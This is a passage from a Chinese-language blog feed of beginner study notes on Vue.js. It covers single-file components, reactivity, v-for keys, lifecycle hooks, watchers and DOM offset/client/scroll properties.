单文件组件</h2><p>我们先看看单文件组件的内容结构，这里推荐Vscode上面的一个插件（Vetur），方便我们.vue文件的书写</p><p><img src="https://s2.loli.net/2022/03/28/vKpaZ7AOjINPGqM.png" alt="单文件组件组成.png"></p><p>我们用到了Vue类型的后缀，（但是浏览器是无法直接识别.vue文件的，所以我们之后会学脚手架）School和Student都是其中的单文件组件，完成对应的功能，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">export default &#123;</span><br><span class="line">    name=&#x27;School&#x27;,</span><br><span class="line">    data()&#123;</span><br><span class="line">                return&#123;</span><br><span class="line">                name:&#x27;swpu&#x27;,</span><br><span class="line">                address:&#x27;新都&#x27;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而App.vue则是管理School和Student的组件，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;School&gt;&lt;/School&gt;</span><br><span class="line">    &lt;Student&gt;&lt;/Student&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import School from &#x27;./School.vue&#x27;</span><br><span class="line">import Student from &#x27;./student.vue&#x27;</span><br><span class="line"></span><br><span class="line">export default &#123;</span><br><span class="line">    name=&#x27;App&#x27;,</span><br><span class="line">    components: &#123; School, Student &#125;,</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>在main中new vue 然后再把app组件写入，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import App from &#x27;./App.vue&#x27;;</span><br><span class="line"></span><br><span class="line">new Vue(&#123;</span><br><span class="line">    el: &quot;#root&quot;,</span><br><span class="line">    //写入模板，在html文件中就可以不用再在div中加app了</span><br><span class="line">    template:`</span><br><span class="line">    &lt;App&gt;&lt;/App&gt;</span><br><span class="line">    `,</span><br><span class="line">    data: &#123;</span><br><span class="line">        components: &#123; App &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>最后在html文件中加入完成script引入等工作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;root&quot;&gt;</span><br><span class="line">        &lt;App&gt;&lt;/App&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;!-- 一定在模板之后加入文件引入 --&gt;</span><br><span class="line">    &lt;script src=&#x27;../js/vue.min.js&#x27;&gt;  &lt;/script&gt;</span><br><span class="line">    &lt;script src=&#x27;../js/main.js&#x27;&gt;  &lt;/script&gt;</span><br></pre></td></tr></table></figure><p>可是这样子的文件是没有办法运行的</p><p><code>import App from &#39;./App.vue&#39;;</code>因为浏览器不认识这个语句，.vue文件那里是浏览器认识的类型呢？</p><p>所以我们马上进入强大的脚手架</p>]]></content>
    
    
    
    <tags>
      
      <tag>组件</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vue数据检测</title>
    <link href="/2022/03/05/vue%E6%95%B0%E6%8D%AE%E6%A3%80%E6%B5%8B/"/>
    <url>/2022/03/05/vue%E6%95%B0%E6%8D%AE%E6%A3%80%E6%B5%8B/</url>
    
    <content type="html"><![CDATA[<p>vue 的数据检测是vue中数据处理模式重要的一环，学习加深对于vue数据处理API的理解</p><span id="more"></span><h1 id="vue数据检测"><a href="#vue数据检测" class="headerlink" title="vue数据检测"></a>vue数据检测</h1><h2 id="1-Vue-set-or-vm-set"><a href="#1-Vue-set-or-vm-set" class="headerlink" title="1.Vue.set() or vm.$set()"></a>1.Vue.set() or vm.$set()</h2><p>这是一个关于数据检测的问题</p><p><img src="https://s2.loli.net/2022/03/14/RTVcury1m2jHPZn.png" alt="vue.set__页面1.png"></p><p>需求：在点击添加学生性别后加入学生性别这一行并显示为男</p><p>引入：Vue.set()函数，传入三个参数set(target,key,val)=&gt;target:传入数据的目标位置（不能是vm/vue和data）,key:属性名称,val:属性值` </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">var vm = new Vue(&#123;</span><br><span class="line">           el: &#x27;#app&#x27;,</span><br><span class="line">           data: &#123;</span><br><span class="line">               sname: &#x27;swpu&#x27;,</span><br><span class="line">               students: &#123;</span><br><span class="line">                   name: &#x27;tom&#x27;</span><br><span class="line">               &#125;,</span><br><span class="line">               friends: [</span><br><span class="line">                   &#123; name: &#x27;jerry&#x27;, age: 18 &#125;,</span><br><span class="line">                   &#123; name: &quot;sherlock&quot;, age: 19 &#125;</span><br><span class="line">               ]</span><br><span class="line"></span><br><span class="line">           &#125;,</span><br><span class="line">           methods: &#123;</span><br><span class="line">               addsex() &#123;//在data中加入数据set(target,key,val)</span><br><span class="line">                   Vue.set(this.students, &#x27;sex&#x27;, &#x27;male&#x27;)//大写V</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;);</span><br></pre></td></tr></table></figure><p>解决：设置一个student对象，在点击button时触发addsex()方法，加入Vue.set()函数，这时便可以在页面上显示学生性别</p><p>局限：由于目标位置不能是vm/vue和data，所以不能在data中直接加入数据，需要设置一个对象在对象下加入</p><h3 id="etc："><a href="#etc：" class="headerlink" title="etc："></a>etc：</h3><p>用一个vm去接Vue实例那么 ：Vue.set()=vm.$set()</p><h2 id="2-检测问题"><a href="#2-检测问题" class="headerlink" title="2.检测问题"></a>2.检测问题</h2><p>一.在click button时method加入这个语句<code>persons[0]=&#123; id: &#39;001&#39;, name: &#39;马老师&#39;, age: 50 &#125;</code> 效果如图</p><p><img src="https://s2.loli.net/2022/03/14/hLl2pETNGi9Cwfy.png" alt="question.png"></p><p>接到的vm中数据已经改变，但是vue中的数据还是原数据</p><p>二.在click之后先打开console查看vm，之后进入vue查看发现数据已经改变</p><p><img src="https://s2.loli.net/2022/03/14/hYlGcxFur4fKWJd.png" alt="q2.png"></p><p>但是页面显示还是原数据</p><h2 id="3-数据检测"><a href="#3-数据检测" class="headerlink" title="3.数据检测"></a>3.数据检测</h2><p>那么为什么会发生上面的情况呢？其实是因为Vue，不承认你的<code>persons[0]=&#123; id: &#39;001&#39;, name: &#39;马老师&#39;, age: 50 &#125;</code> 语句，这个语句实际上的调用 person[0]中的setter方法，但是我们看看person[0]</p><p><img src="https://s2.loli.net/2022/03/14/Iwy7hAgi5O2nKbE.png" alt="数组检测reason.png"></p><p>在这个数组hobby中没有为数组中元素设置的getter和setter方法，所以我们的语句无效</p><p>其实Vue承认数组改变的条件便是数组调用了这7个函数(push,pop,sort,shift(头删),unshift(头插),splice(替换),revrse(倒序),)</p><p>我们在使用这些函数的时候，Vue中的这个数据便会触发响应式，引起页面的变化</p><p><img src="https://s2.loli.net/2022/03/14/zinPvOaSy7eQFBV.png" alt="数组响应式.png"></p><h3 id="所以"><a href="#所以" class="headerlink" title="所以"></a>所以</h3><p>我们上面问题的代码应该是<code>person.splice(0,1,&#123; id: &#39;001&#39;, name: &#39;马老师&#39;, age: 50 &#125;)</code>或者使用<code>Vue.set(vm.person,0,&#123;id: &#39;001&#39;, name: &#39;马老师&#39;, age: 50 &#125;)</code>都可以实现数据的更新</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><img src="https://s2.loli.net/2022/03/14/bgIKv4dZaTYwki1.png" alt="vue监测总结.png"></p><p>需要注意的两个点：</p><p>1.在数组是对象数组的情况下，单个数组元素里面的对象属性是自带get和set方法的</p><p>2.因为修改数组的响应式方法没有filter()，所以，如果想要实现过滤便要如下图进行操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">filsmoke()&#123;</span><br><span class="line"></span><br><span class="line">​          //因为数组操作没有filter，所以实现响应式就需要用原来的数据去接</span><br><span class="line"></span><br><span class="line">​          this.students.hobby=this.students.hobby.filter((h)=&gt;&#123;</span><br><span class="line"></span><br><span class="line">​            return h!==&#x27;抽烟&#x27;</span><br><span class="line"></span><br><span class="line">​          &#125;)</span><br><span class="line"></span><br><span class="line">​        &#125;</span><br></pre></td></tr></table></figure><p>filter()方法会形成一个新的数组，我们需要把这个数组赋值给原数组，这样才能改变原数组，另外根据需求需要把原来的数组进行备份</p><h2 id="Ending"><a href="#Ending" class="headerlink" title="Ending"></a>Ending</h2><p>最后解释我们常说的数据劫持：</p><p>数据劫持，便是将写入data的数据增加get和set方法，数据就拥有了自己的响应式，在读取数据（get）和修改数据（set）的时候都需要调用get和set方法“劫持”，根据get和set方法进行修改和读取并解析模板。生成虚拟dom…等vue内含的一切操作。</p>]]></content>
    
    
    
    <tags>
      
      <tag>vue</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>列表渲染</title>
    <link href="/2022/03/05/%E5%88%97%E8%A1%A8%E6%B8%B2%E6%9F%93/"/>
    <url>/2022/03/05/%E5%88%97%E8%A1%A8%E6%B8%B2%E6%9F%93/</url>
    
    <content type="html"><![CDATA[<h1 id="列表渲染"><a href="#列表渲染" class="headerlink" title="列表渲染"></a>列表渲染</h1><span id="more"></span><h2 id="1-首先得到一个列表（v-for）"><a href="#1-首先得到一个列表（v-for）" class="headerlink" title="1.首先得到一个列表（v-for）"></a>1.首先得到一个列表（v-for）</h2><pre><code>    &lt;ul&gt;        &lt;h2&gt;人员列表&lt;/h2&gt;        &lt;!-- v-for实现循环 在使用插值语法进行显示--&gt;        &lt;li v-for=&quot;p in persons&quot;&gt;&#123;&#123;p.name&#125;&#125;-&#123;&#123;p.age&#125;&#125; &lt;/li&gt;    &lt;/ul&gt;&lt;/div&gt;&lt;script&gt;    Vue.config.devtools = true    Vue.config.productionTip = false    var vm = new Vue(&#123;        el: &#39;#app&#39;,        data: &#123;            // persons是一个数组,里面有很多对象            persons:[                &#123;id:&#39;001&#39;,name:&#39;张三&#39;,age:18&#125;,                &#123;id:&#39;002&#39;,name:&#39;李四&#39;,age:19&#125;,                &#123;id:&#39;003&#39;,name:&#39;王五&#39;,age:21&#125;            ]        &#125;    &#125;);</code></pre><p>v-for类似于一个for循环，而其中的in就是类似于for循环中的in 其中persons就是循环池子，而p就是循环的单个元素</p><pre><code>    &lt;ul&gt;        &lt;h2&gt;人员列表&lt;/h2&gt;        &lt;!-- v-for实现循环 在使用插值语法进行显示--&gt;        &lt;li v-for=&quot;(p,index) in persons&quot; :key=&quot;p.id&quot;&gt;&#123;&#123;p.name&#125;&#125;-&#123;&#123;p.age&#125;&#125;--&#123;&#123;index&#125;&#125; &lt;/li&gt;        &lt;!-- index 是一个数字的标识，而key是选定唯一标志 --&gt;    &lt;/ul&gt;</code></pre><p>在加入index和:key之后便是一个真正完整的v-for循环 得到如下效果：</p><p><img src="https://s2.loli.net/2022/03/06/PToBhGiDf7vwyAs.png" alt="v-for.png"></p><h3 id="同时v-for也可以遍历对象"><a href="#同时v-for也可以遍历对象" class="headerlink" title="同时v-for也可以遍历对象"></a>同时v-for也可以遍历对象</h3><pre><code>    &lt;ul&gt;        &lt;li v-for=&quot;(value,key) in car&quot; :key=&quot;key&quot;&gt;&#123;&#123;key&#125;&#125;--&#123;&#123;value&#125;&#125;&lt;/li&gt;        &lt;!-- 这里的key是car中的属性名 --&gt;    &lt;/ul&gt;</code></pre><p>此时的第二个属性和前面不同，其中的key是对象中的属性名</p><h3 id="遍历字符串"><a href="#遍历字符串" class="headerlink" title="遍历字符串"></a>遍历字符串</h3><pre><code>    &lt;ul&gt;        &lt;li v-for=&quot;(char,index) in str&quot; :key=&quot;index&quot;&gt;&#123;&#123;char&#125;&#125;--&#123;&#123;index&#125;&#125;&lt;/li&gt;    &lt;/ul&gt;</code></pre><p>  与数组类似 </p><h2 id="2-key的作用"><a href="#2-key的作用" class="headerlink" title="2.key的作用"></a>2.<code>key</code>的作用</h2><p>在探讨key的作用之前，先用一个案例引出问题</p><p><img src="https://s2.loli.net/2022/03/06/uo3fmylnQEkH7TI.png" alt="key的作用2.png"></p><p>在一个v-for实现的遍历列表下在每个节点后加入一个input框，并写下各自对应的内容。现在我们首部插入一个新的节点，得到的dom页面变成了这样：</p><p><img src="https://s2.loli.net/2022/03/06/7xPe31kRXS2CAWc.png" alt="key的作用1.png"></p><p>不难发现，input框与li内容之间出现了错乱，而这种错乱出现的原因就是——vue虚拟dom的对比机制——说白了就是那个:key 后面的值是index引起的</p><p><img src="https://s2.loli.net/2022/03/06/AO7fzWIjJ1FHU8Y.png" alt="为什么index不能作为key.png"></p><p>虚拟dom的对比算法要<strong>根据key</strong>对比改变前的每一个节点，li中的文本内容很明显不同，于是<strong>生成新的节点，替代原来的节点，并赋上新值</strong> ，但是当对比input框时，由于<strong>填写的信息在虚拟dom中不可见</strong>，于是<strong>虚拟dom会把这两个当做一样的节点，不覆盖，直接使用</strong> 便导致了信息的错乱。</p><p>此外将key设置成index还有效率问题，<strong>因为对比失败会生成一个新的节点并插入，导致dom的节点被频繁操作</strong>，效率严重下降。</p><p>所以：</p><p><img src="https://s2.loli.net/2022/03/06/m4ZQeS6uX5GhdTv.png" alt="key的内部原理总结.png"></p><p>在key的选择上面：<strong>选择每条数据的唯一标识作为你的key</strong>，减少出错，提高效率。</p><h2 id="3-列表过滤"><a href="#3-列表过滤" class="headerlink" title="3.列表过滤"></a>3.列表过滤</h2><p><img src="https://s2.loli.net/2022/03/06/1xasWgFovytX2Si.png" alt="列表过滤.png"></p><p>列表过滤的两个需要注意的点便是：</p><p>1.需要设置一个filpersons，以免直接修改persons，保留persons的模板</p><p>2.需要immediate的配置项，而且keyword设置成空字符串，这样子便可以在加载时触发空字符串搜索，实现一开始显示全部搜索内容</p><h2 id="4-列表排序"><a href="#4-列表排序" class="headerlink" title="4.列表排序"></a>4.列表排序</h2><p><img src="https://s2.loli.net/2022/03/06/RA19c8TBg5YEn7P.png" alt="列表排序.png"></p><p>列表排序中的重点：</p><p>1.需要用一个定义的arr去接过滤出的数组</p><p>2.进行排序类型的判断</p><p>3.根据类型使用sort函数进行排序=&gt;(<code>sort(a,b)</code>,a-b便是升序，b-a便是降序)</p><p>4.最后返回这个函数</p><p>！！因为返回的参数比较多–<strong>牢记每个函数都需要一个返回值</strong></p>]]></content>
    
    
    
    <tags>
      
      <tag>vue</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>生命周期函数</title>
    <link href="/2022/03/05/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E5%87%BD%E6%95%B0/"/>
    <url>/2022/03/05/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E5%87%BD%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="生命周期函数"><a href="#生命周期函数" class="headerlink" title="生命周期函数"></a>生命周期函数</h1><h2 id="一-引入"><a href="#一-引入" class="headerlink" title="一 . 引入"></a>一 . 引入</h2><p>实现页面文字的闪动效果，需要改变文字透明度 =》设置一个interval 然后改变透明度。<em>因为是自动闪动所以我们不能使用点击按钮等等</em></p><p><img src="https://s2.loli.net/2022/03/14/2yYDwu6KeJMSvnq.png" alt="method写闪动.png"></p><p>现在我们看到的是用method里面的change写出的闪动，有明显的调用问题，因为修改<code>opacity</code>便会引起重新解析模板那么又会触发change函数,于是我们的interval将会爆炸式的增加</p><p>所以我们需要的是一个执行一次的回调函数</p><p>也就是我们的生命周期函数</p><p><img src="https://s2.loli.net/2022/03/14/26AjRvK3xPBTidz.png" alt="mounted写闪动.png"></p><p>生命周期函数有许多个，在不同的时期，Vue会调用不同的生命周期函数，mounted是挂载完成时调用（<em>也就是Vue加载完成时</em>），调用后修改模板不会引起再次调用，因为挂载时期已经过去</p><h2 id="分析各个函数的执行时期"><a href="#分析各个函数的执行时期" class="headerlink" title="分析各个函数的执行时期"></a>分析各个函数的执行时期</h2><h6 id="原图查看-https-cn-vuejs-org-images-lifecycle-png"><a href="#原图查看-https-cn-vuejs-org-images-lifecycle-png" class="headerlink" title="原图查看   https://cn.vuejs.org/images/lifecycle.png"></a>原图查看   <a href="https://cn.vuejs.org/images/lifecycle.png">https://cn.vuejs.org/images/lifecycle.png</a></h6><h3 id="create阶段（创建数据检测和数据代理）"><a href="#create阶段（创建数据检测和数据代理）" class="headerlink" title="create阶段（创建数据检测和数据代理）"></a>create阶段（创建数据检测和数据代理）</h3><p><img src="https://s2.loli.net/2022/03/14/lsKYhQuLbX5zeqv.png" alt="生命周期函数图示1.png"></p><p><code>beforeCreate</code>:此时Vue只有Event和Lifecycle，在此时输出Vue，会发现没有data数据也没有函数等等的引入，也就是你Vue中的数据都没有引入</p><p><code>created</code>:此时加入了数据检测和数据代理，你的方法和data中的数据已经加载进了Vue</p><p>判断框：<strong>此时开始解析模板，生成虚拟dom，但是还没有转换成真实dom插入页面</strong>。其中有一个template配置项，没有便会把整个包括写了el对应的标签都当做模板，有的话便只是把里面的代码当做模板</p><h3 id="mount阶段"><a href="#mount阶段" class="headerlink" title="mount阶段"></a>mount阶段</h3><p><img src="https://s2.loli.net/2022/03/14/U3JR5y2dLcp67Ah.png" alt="生命周期函数图示2.png"></p><p><code>beforeMount</code>:此时你可以拿到已经生成虚拟dom但是因为没有转成真实dom，页面也还没有经过编译，所以此时你对dom修改也不会有效</p><p><code>mounted</code>：在beforemount和mounted之间便是mount也就是 虚拟dom转换成了真实dom(还在vm.$el里面存了节点)，页面中呈现的也是经过Vue编译的dom，此时可以修改dom但是尽可能避免</p><h3 id="update阶段"><a href="#update阶段" class="headerlink" title="update阶段"></a>update阶段</h3><p><img src="https://s2.loli.net/2022/03/14/MUj3eGHgaFvuYRA.png" alt="生命周期函数更新.png"></p><p><code>beforeUpdate</code>:此时数据已经更新但是还没有转换到页面上，特点是数据与页面的不统一</p><p><code>updated</code>：更新完成，数据与页面统一显示</p><h3 id="destroy阶段"><a href="#destroy阶段" class="headerlink" title="destroy阶段"></a>destroy阶段</h3><p>最后便是Vue的销毁阶段，而要触发Vue的销毁，我们需要一个函数=&gt;<code>vm.$destroy()</code></p><p>它的作用是：1.完全销毁一个实例。清理它与其它实例的连接（与其他组件之间的链接），解绑它的全部指令及事件监听器（<strong>注意是自定                     义事件，原生dom事件是不会解除的</strong>）。</p><p>​                      2.触发 <code>beforeDestroy</code> 和 <code>destroyed</code> 的钩子。</p><p><img src="https://s2.loli.net/2022/03/14/WbiLAUxhj94dXaD.png" alt="生命周期函数销毁.png"></p><p><code>beforeDestroy</code>:在$destroy触发后进行，数据修改执行但是不显示在页面，所以通常用于关闭定时器等等收尾操作</p><p><code>destroyed</code>:注意绿框，在关闭监视器，事件监听器，子组件等后执行</p><h2 id="Ending"><a href="#Ending" class="headerlink" title="Ending"></a>Ending</h2><p>四对函数，代表了vm的四个时期，除了这四个函数本身，我们更需要注意的是，这四个函数之间的联系，每一对函数之间的联系即在他们中间发生了什么事。</p>]]></content>
    
    
    
    <tags>
      
      <tag>Vue</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>深度监视</title>
    <link href="/2022/03/05/%E6%B7%B1%E5%BA%A6%E7%9B%91%E8%A7%86/"/>
    <url>/2022/03/05/%E6%B7%B1%E5%BA%A6%E7%9B%91%E8%A7%86/</url>
    
    <content type="html"><![CDATA[<h1 id="深度监视"><a href="#深度监视" class="headerlink" title="深度监视"></a>深度监视</h1><p><img src="https://s2.loli.net/2022/03/06/gjE7A89qlNfoMcO.png" alt="深度监视 numbers监视的是什么.png"></p><p>在watch中的numbers监测的并不会监测a和b的变化，监测的只是整个地址。如需监测a，b需要<code>&#39;numbers.a&#39;</code>再进行配置</p><p>于是出现了deep配置项-深度监视</p><p><img src="https://s2.loli.net/2022/03/06/QViEFOUHo6L8SgR.png" alt="深度监视.png"></p><p><code>deep:true</code>便是打开了深度监视</p><h3 id="注意：deep：监视多级结构中的全部属性"><a href="#注意：deep：监视多级结构中的全部属性" class="headerlink" title="注意：deep：监视多级结构中的全部属性"></a>注意：deep：监视多级结构中的全部属性</h3><h3 id="‘object-xxx’-监视多级结构中的某一个属性"><a href="#‘object-xxx’-监视多级结构中的某一个属性" class="headerlink" title="‘object.xxx’:监视多级结构中的某一个属性"></a>‘object.xxx’:监视多级结构中的某一个属性</h3><h1 id="简写形式"><a href="#简写形式" class="headerlink" title="简写形式"></a>简写形式</h1><p><img src="https://s2.loli.net/2022/03/06/ztP6hNqp9W3SFau.png" alt="监视属性简写.png"></p><p>在<strong>只有handler配置项</strong>的情况下，可以使用简写形式，<strong>类似于computed的简写</strong></p><h1 id="computed和Watch的区别"><a href="#computed和Watch的区别" class="headerlink" title="computed和Watch的区别"></a>computed和Watch的区别</h1><p><img src="https://s2.loli.net/2022/03/06/cqOP3wknXylgMRN.png" alt="watch于computed对比1.png"></p><p>区别分为下面两种情况</p><p>1.如果watch和computed都可以完成计算属性的需求，那么最好使用computed，因为写法简单</p><p>2.但是对于一些无法使用computed的情况，如下图</p><p><img src="https://s2.loli.net/2022/03/06/2iOSIAjaK6YhBmr.png" alt="watch和computed对比.png"></p><p>​    此时的fullname会报错，因为<code>return</code>中是setTimeout的返回值，而fullname当中的返回值没有了，这也说明fullname()是不支持异步计算的</p><p><strong>需要注意的是：这里的setTimeout需要写成箭头函数，如果是一般的函数this指向的是window，而箭头函数没有自己的this，往外一找，于是找到了fullname既是vm</strong></p><p><img src="https://s2.loli.net/2022/03/06/KbWymOLv6UGnguR.png" alt="wc区别小总结.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>vue</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>网页特效三——offset，client以及scroll</title>
    <link href="/2022/03/05/%E7%BD%91%E9%A1%B5%E7%89%B9%E6%95%88%E4%B8%89%E2%80%94%E2%80%94offset%EF%BC%8Cclient%E4%BB%A5%E5%8F%8Ascroll/"/>
    <url>/2022/03/05/%E7%BD%91%E9%A1%B5%E7%89%B9%E6%95%88%E4%B8%89%E2%80%94%E2%80%94offset%EF%BC%8Cclient%E4%BB%A5%E5%8F%8Ascroll/</url>
    
    <content type="html"><![CDATA[<h2 id="网页特效三——offset，client以及scroll"><a href="#网页特效三——offset，client以及scroll" class="headerlink" title="网页特效三——offset，client以及scroll"></a>网页特效三——offset，client以及scroll</h2><h2 id="一，offset系列："><a href="#一，offset系列：" class="headerlink" title="一，offset系列："></a>一，offset系列：</h2><h3 id="1-offset（元素偏移量）：offset的类型有offsetTop，offsetLeft，offsetWidth，offsetHeight和offsetParent几种，使用语法是element-offsetTop以获取-在有定位的父级元素下的距离。"><a href="#1-offset（元素偏移量）：offset的类型有offsetTop，offsetLeft，offsetWidth，offsetHeight和offsetParent几种，使用语法是element-offsetTop以获取-在有定位的父级元素下的距离。" class="headerlink" title="(1).offset（元素偏移量）：offset的类型有offsetTop，offsetLeft，offsetWidth，offsetHeight和offsetParent几种，使用语法是element.offsetTop以获取 在有定位的父级元素下的距离。"></a>(1).offset（元素偏移量）：offset的类型有offsetTop，offsetLeft，offsetWidth，offsetHeight和offsetParent几种，使用语法是<code>element.offsetTop</code>以获取 <em>在有定位的父级元素下的距离。</em></h3><h3 id="2-offset与style-xxx的区别：其他的区别不赘述主要是"><a href="#2-offset与style-xxx的区别：其他的区别不赘述主要是" class="headerlink" title="(2).offset与style.xxx的区别：其他的区别不赘述主要是"></a>(2).offset与style.xxx的区别：其他的区别不赘述主要是</h3><p>(1)：offset得到的是数值型数据，所以在使用数据时需要加上’px’.</p><p>(2) ：offset只能读取数据，没有赋值功能即：<code>var div.offsetTop=100+&#39;px&#39;;</code> 一般都是利用<code>element.style.top=100px;</code>来赋值。</p><p><img src="https://s2.loli.net/2022/03/06/g7jOAEQyXivze3J.png" alt="屏幕截图 2022-01-18 174349.png"></p><h4 id="3-offset应用举例"><a href="#3-offset应用举例" class="headerlink" title="(3).offset应用举例"></a>(3).offset应用举例</h4><p>offset的引用在目前学习看来是联合鼠标进行鼠标的定位（获取鼠标的坐标：<code>e.pagex/y</code>）通过div的offset读取坐标，可以得到两种重要数据</p><p>（1）鼠标在盒子中的相对位置</p><p>（2）盒子需要移动时，盒子的位置</p><p><em>这两个数据是计算 移动遮罩层 和 让盒子随鼠标移动 的必备数据</em></p><h2 id="二-client系列"><a href="#二-client系列" class="headerlink" title="二, client系列"></a>二, client系列</h2><h3 id="1-client-元素可视区-：拥有clientTop-Left-Width-Height四个种类，使用语法是element-clientTop-其主要特点如下图："><a href="#1-client-元素可视区-：拥有clientTop-Left-Width-Height四个种类，使用语法是element-clientTop-其主要特点如下图：" class="headerlink" title="(1).client(元素可视区)：拥有clientTop/Left/Width/Height四个种类，使用语法是element.clientTop ,其主要特点如下图："></a>(1).client(元素可视区)：拥有clientTop/Left/Width/Height四个种类，使用语法是<code>element.clientTop</code> ,其主要特点如下图：</h3><p><img src="https://s2.loli.net/2022/03/06/MRwcpxqLGWb73DS.png" alt="client特点.png"></p><h3 id="2-client的作用"><a href="#2-client的作用" class="headerlink" title="(2).client的作用"></a>(2).client的作用</h3><p>其实client的作用主要是根据可视区(也就是你的window)去调节相应的字体大小和格式</p><p><img src="https://s2.loli.net/2022/03/06/gmXxkyUWAdBoiYJ.png" alt="image.png"></p><p>这个便是我们HTML元素文字大小设置的函数(取自某宝的前端代码)，调用这个函数得到rem便是字体的单位。</p><p>那在什么条件下触发这个函数呢？</p><p><img src="https://s2.loli.net/2022/03/06/OdYiouCqKlDpavE.png" alt="屏幕大小改变的情况下重置rem.png"></p><p>第一个addEventListener触发条件是resize及<em>页面的大小发生缩放</em>，此时触发setRemUnit函数根据缩放后页面的大小调整字体大小。</p><p>第二个addEventListener触发条件是pagehow及<em>页面的刷新或者重新加载</em>（该与load事件有所不同）<img src="https://s2.loli.net/2022/03/06/Gm9XCbZNHp17WQy.png" alt="pageshow 与onload事件的区别.png"></p><p>此时有一个判断条件e.persisted简单来说就是你这个是Firefox中靠前进后退取得的页面，那么即使有缓存，也可以重新设置字体大小。</p><h2 id="三，scroll系列"><a href="#三，scroll系列" class="headerlink" title="三，scroll系列"></a>三，scroll系列</h2><h3 id="1-scroll-元素滚动-依然具有scrollTop-Left-Width-Height四个属性，语法element-scrollTop特别注意scroll的数值所对应的含义"><a href="#1-scroll-元素滚动-依然具有scrollTop-Left-Width-Height四个属性，语法element-scrollTop特别注意scroll的数值所对应的含义" class="headerlink" title="(1).scroll(元素滚动):依然具有scrollTop/Left/Width/Height四个属性，语法element.scrollTop特别注意scroll的数值所对应的含义"></a>(1).scroll(元素滚动):依然具有scrollTop/Left/Width/Height四个属性，语法<code>element.scrollTop</code>特别注意scroll的数值所对应的含义<img src="https://s2.loli.net/2022/03/06/xKX8iVFNwnzq3sr.png" alt="scroll三个数值图示.png"></h3><p><em>红线代表盒子，Top和Left是被卷去的部分，而Height是总长，width是总宽</em></p><h3 id="2-scroll-的作用"><a href="#2-scroll-的作用" class="headerlink" title="(2).scroll 的作用"></a>(2).scroll 的作用</h3><p>这里举最常见是scroll应用</p><p><img src="https://s2.loli.net/2022/03/06/cb5d9qa6wVT1fUs.png" alt="scroll事件展示（1）.png"></p><p><img src="https://s2.loli.net/2022/03/06/bFLiX6txUIBD1o9.png" alt="scroll事件展示（2）.png"></p><p>在页面滚动到一定位置时将右边navigator的定位改为固定定位并展示返回的span</p><p><img src="https://s2.loli.net/2022/03/06/zMeNKI6iwnBTU8X.png" alt="scroll事件代码.png"></p><p>addEventListener所用到的事件是scroll滚动事件<em>只要页面滚动便会触发</em>当卷去的距离(pageYOffset)大于一定阈值时改变定位</p><p>需要注意的是这个案例需要考虑跳动的问题，及在改变定位时navigator的位置因为不统一发生跳动</p><p><img src="https://s2.loli.net/2022/03/06/njdEpqUev16rAVR.jpg" alt="InkedInkedscroll事件展示（1）_LI.jpg"></p><p>x便是发生跳动的距离，解决方案便是让改变定位后navigator的top值等于top1</p>]]></content>
    
    
    
    <tags>
      
      <tag>bom</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>html</title>
    <link href="/2022/01/16/html/"/>
